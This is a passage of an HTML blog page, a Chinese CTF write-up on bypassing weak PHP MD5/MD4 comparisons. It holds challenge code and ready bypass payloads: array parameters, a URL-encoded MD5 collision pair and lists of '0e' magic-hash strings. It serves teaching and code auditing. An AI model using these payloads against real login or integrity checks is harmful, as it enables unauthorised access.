@@ -1,0 +1,1440 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="PHP MD5 Bypass Trick, Qftm">
+    <meta name="description" content="Maybe a hacker">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>PHP MD5 Bypass Trick | Qftm</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Qftm</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-heartbeat" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Qftm</div>
+        <div class="logo-desc">
+            
+            Maybe a hacker
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-heartbeat"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/bg.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">PHP MD5 Bypass Trick</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/PHP/">
+                                <span class="chip bg-color">PHP</span>
+                            </a>
+                        
+                            <a href="/tags/MD5/">
+                                <span class="chip bg-color">MD5</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2020-08-23
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
+                    2020-10-20
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    3.3k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
+                    15 Min
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>该篇主要记录有关PHP代码中MD5逻辑缺陷的绕过技巧【update+ing】</p>
+<h1 id="PHP-逻辑类型"><a href="#PHP-逻辑类型" class="headerlink" title="PHP-逻辑类型"></a>PHP-逻辑类型</h1><p><a href="https://www.php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">PHP 类型比较表</a></p>
+<h2 id="弱类型-松散比较"><a href="#弱类型-松散比较" class="headerlink" title="弱类型-松散比较"></a>弱类型-松散比较</h2><ul>
+<li><strong>弱类型比较</strong></li>
+</ul>
+<p>字符<code>==</code>：【不比较数据类型】、【仅比较数据值=&gt;数据值相同】</p>
+<p>字符<code>!=</code>：【仅比较数据值=&gt;数据值不同】</p>
+<p><img src="/2020/08/23/php-md5-bypass-audit/image-20200826185612440.png" alt="image-20200826185612440"></p>
+<ul>
+<li><strong>Example</strong></li>
+</ul>
+<p>字符串类型和数字类型进行比较时，字符串强制转换为数字：如果字符串开头有数字则转为开头的数子，如果开头无数字则为数字<code>0</code></p>
+<pre class="line-numbers language-bash"><code class="language-bash">λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: php -r var_dump<span class="token punctuation">(</span>11<span class="token operator">==</span><span class="token string">'11sss'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+Command line code:1:
+bool<span class="token punctuation">(</span>true<span class="token punctuation">)</span>
+
+λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: php -r var_dump<span class="token punctuation">(</span>11<span class="token operator">==</span><span class="token string">'sss'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+Command line code:1:
+bool<span class="token punctuation">(</span>false<span class="token punctuation">)</span>
+
+λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: php -r var_dump<span class="token punctuation">(</span>0<span class="token operator">==</span><span class="token string">'sss'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+Command line code:1:
+bool<span class="token punctuation">(</span>true<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="强类型-严格比较"><a href="#强类型-严格比较" class="headerlink" title="强类型-严格比较"></a>强类型-严格比较</h2><ul>
+<li><strong>强类型比较</strong></li>
+</ul>
+<p>字符<code>===</code>：【比较数据类型=&gt;数据类型相同】<code>and</code>【比较数据值=&gt;数据值相同】</p>
+<p>字符<code>!==</code>：【比较数据类型=&gt;数据类型不同】<code>or</code>【比较数据值=&gt;数据值不同】</p>
+<p><img src="/2020/08/23/php-md5-bypass-audit/image-20200826200951931.png" alt="image-20200826200951931"></p>
+<ul>
+<li><strong>Example</strong></li>
+</ul>
+<p>不同数据类型比较为False，相同数据类型比较数据值</p>
+<pre class="line-numbers language-bash"><code class="language-bash">λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: php -r var_dump<span class="token punctuation">(</span>111<span class="token operator">==</span><span class="token operator">=</span><span class="token string">'111'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+Command line code:1:
+bool<span class="token punctuation">(</span>false<span class="token punctuation">)</span>
+
+λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: php -r var_dump<span class="token punctuation">(</span>111<span class="token operator">==</span><span class="token operator">=</span>22<span class="token punctuation">)</span><span class="token punctuation">;</span>
+Command line code:1:
+bool<span class="token punctuation">(</span>false<span class="token punctuation">)</span>
+
+λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: php -r var_dump<span class="token punctuation">(</span>111<span class="token operator">==</span><span class="token operator">=</span>111<span class="token punctuation">)</span><span class="token punctuation">;</span>
+Command line code:1:
+bool<span class="token punctuation">(</span>true<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="MD4-1-弱类型-挑战"><a href="#MD4-1-弱类型-挑战" class="headerlink" title="MD4-1-弱类型-挑战"></a>MD4-1-弱类型-挑战</h1><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token string">"md4"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'False！！！！！！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"Success！！！！！！"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"Please input the user！&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>代码中的if判断<code>!=</code>为弱类型判断，可以使用科学计数法<code>0e</code>进行绕过：通过md4碰撞，得到特定的字符串【科学计数法表示】加密的结果同为科学计数法表示。【注意：这里的科学计数法所表示的字符串<code>0e</code>后面不能包含字母而应该是纯数字】</p>
+<ul>
+<li><strong>MD4 Collision</strong></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Plaintext</th>
+<th>MD4 Hash</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0e001233333333333334557778889</td>
+<td>0e434041524824285414215559233446</td>
+</tr>
+<tr>
+<td>0e00000111222333333666788888889</td>
+<td>0e641853458593358523155449768529</td>
+</tr>
+</tbody></table>
+<ul>
+<li><strong>Bypass</strong></li>
+</ul>
+<p>弱类型判断<code>!=</code>，<code>0e</code>科学计数法不论<code>0e</code>后面是什么数子，结果都为0，即：<code>0e111111==0e2551515</code> -&gt; <code>0==0</code> -&gt; <code>bool(true)</code></p>
+<p><img src="/2020/08/23/php-md5-bypass-audit/image-20200826181336952.png" alt="image-20200826181336952"></p>
+<h1 id="MD5-1-弱类型-挑战"><a href="#MD5-1-弱类型-挑战" class="headerlink" title="MD5-1-弱类型-挑战"></a>MD5-1-弱类型-挑战</h1><h2 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
+<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$user</span> <span class="token operator">!=</span> <span class="token variable">$pass</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"False！！！！！！"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"Please input the user and pass ！&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="Bypass-1"><a href="#Bypass-1" class="headerlink" title="Bypass"></a>Bypass</h2><p>弱类型比较，绕过手法：数组绕过、碰撞绕过、科学计数法绕过</p>
+<ul>
+<li><strong>数组绕过</strong></li>
+</ul>
+<p>在PHP中MD5函数默认接收的参数为字符串，当参数为数组进行解密时默认返回值为<code>Null</code></p>
+<pre class="line-numbers language-bash"><code class="language-bash">λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: php -r var_dump<span class="token punctuation">(</span>md5<span class="token punctuation">(</span>array<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+Warning: md5<span class="token punctuation">(</span><span class="token punctuation">)</span> expects parameter 1 to be string, array given <span class="token keyword">in</span> Command line code on line 1
+
+Call Stack:
+    0.0013     400640   1. <span class="token punctuation">{</span>main<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span> Command line code:0
+    0.0013     400640   2. md5<span class="token punctuation">(</span>array<span class="token punctuation">(</span>0<span class="token punctuation">))</span> Command line code:1
+
+Command line code:1:
+NULL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>利用php该特性进行绕过MD5逻辑限制</p>
+<pre><code>?user[]=1&amp;pass[]=11</code></pre><p><img src="/2020/08/23/php-md5-bypass-audit/image-20200826202743728.png" alt="image-20200826202743728"></p>
+<ul>
+<li><strong>MD5 碰撞</strong></li>
+</ul>
+<p>通过MD5碰撞，构造特殊的两个不同的内容生成相同的MD5值</p>
+<pre class="line-numbers language-txt"><code class="language-txt">user=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%16%B4%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%DC%9F%95ab%D2%09P%A1%5D%12%3B%1ETZ%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29%EF%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%1E%7Ch%B0%96%A7%E5U%EBn1q%CA%D0%8B%C7%1BSP
+
+pass=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%164%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%5C%A0%95ab%D2%09P%A1%5D%12%3B%1ET%DA%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29o%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%9E%7Bh%B0%96%A7%E5U%EBn1q%CA%D0%0B%C7%1BSP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>特殊字符串绕过</p>
+<p><img src="/2020/08/23/php-md5-bypass-audit/image-20200826203126477.png" alt="image-20200826203126477"></p>
+<ul>
+<li><strong>科学计数法</strong></li>
+</ul>
+<p>弱类型比较，使用特殊字符串产生的科学计数法结果进行绕过，脚本爆出常见的特殊字符串如下：</p>
+<p>纯大写字母类</p>
+<pre class="line-numbers language-txt"><code class="language-txt">QLTHNDT 0e405967825401955372549139051580
+QNKCDZO 0e830400451993494058024219903391
+EEIZDOI 0e782601363539291779881938479162
+TUFEPMC 0e839407194569345277863905212547
+UTIPEZQ 0e382098788231234954670291303879
+UYXFLOI 0e552539585246568817348686838809
+IHKFRNS 0e256160682445802696926137988570
+PJNPDWY 0e291529052894702774557631701704
+ABJIHVY 0e755264355178451322893275696586
+DQWRASX 0e742373665639232907775599582643
+DYAXWCA 0e424759758842488633464374063001
+GEGHBXL 0e248776895502908863709684713578
+GGHMVOE 0e362766013028313274586933780773
+GZECLQZ 0e537612333747236407713628225676
+NWWKITQ 0e763082070976038347657360817689
+NOOPCJF 0e818888003657176127862245791911
+MAUXXQC 0e478478466848439040434801845361
+MMHUWUV 0e701732711630150438129209816536<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>纯数字类</p>
+<pre class="line-numbers language-txt"><code class="language-txt">240610708 0e462097431906509019562988736854
+314282422 0e990995504821699494520356953734
+571579406 0e972379832854295224118025748221
+903251147 0e174510503823932942361353209384
+1110242161 0e435874558488625891324861198103
+1320830526 0e912095958985483346995414060832
+1586264293 0e622743671155995737639662718498
+2302756269 0e250566888497473798724426794462
+2427435592 0e067696952328669732475498472343
+2653531602 0e877487522341544758028810610885
+3293867441 0e471001201303602543921144570260
+3295421201 0e703870333002232681239618856220
+3465814713 0e258631645650999664521705537122
+3524854780 0e507419062489887827087815735195
+3908336290 0e807624498959190415881248245271
+4011627063 0e485805687034439905938362701775
+4775635065 0e998212089946640967599450361168
+4790555361 0e643442214660994430134492464512
+5432453531 0e512318699085881630861890526097
+5579679820 0e877622011730221803461740184915
+5585393579 0e664357355382305805992765337023
+6376552501 0e165886706997482187870215578015
+7124129977 0e500007361044747804682122060876
+7197546197 0e915188576072469101457315675502
+7656486157 0e451569119711843337267091732412<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>大小写字母混合类</p>
+<pre class="line-numbers language-txt"><code class="language-txt">aaaXXAYW 0e540853622400160407992788832284
+aabg7XSs 0e087386482136013740957780965295
+aabC9RqS 0e041022518165728065344349536299<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>原科学计数法类</p>
+<pre class="line-numbers language-txt"><code class="language-txt">0e215962017 0e291242476940776845150308577824<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>利用上述科学计数法类特性进行弱类型绕过</p>
+<p><img src="/2020/08/23/php-md5-bypass-audit/image-20200826204130347.png" alt="image-20200826204130347"></p>
+<h1 id="MD5-2-若类型-挑战"><a href="#MD5-2-若类型-挑战" class="headerlink" title="MD5-2-若类型-挑战"></a>MD5-2-若类型-挑战</h1><h2 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ctype_alpha</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"&lt;/br>login successful&lt;/br>"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"login failed!&lt;br>"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string">"False！！！！！！"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"Please input the user and pass ！&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="Bypass-2"><a href="#Bypass-2" class="headerlink" title="Bypass"></a>Bypass</h2><p>和<code>MD5-1-弱类型-挑战</code>不同之处在于多了数据类型判断<code>!ctype_alpha($user) &amp;&amp; !is_numeric($pass)</code>，绕过手段：碰撞绕过</p>
+<ul>
+<li><strong>碰撞绕过</strong></li>
+</ul>
+<p>由于代码逻辑做了数据类型判断，这里只能通过碰撞绕过：同<code>MD5-1-弱类型-挑战</code>中碰撞一样</p>
+<pre><code>user=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%16%B4%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%DC%9F%95ab%D2%09P%A1%5D%12%3B%1ETZ%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29%EF%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%1E%7Ch%B0%96%A7%E5U%EBn1q%CA%D0%8B%C7%1BSP
+
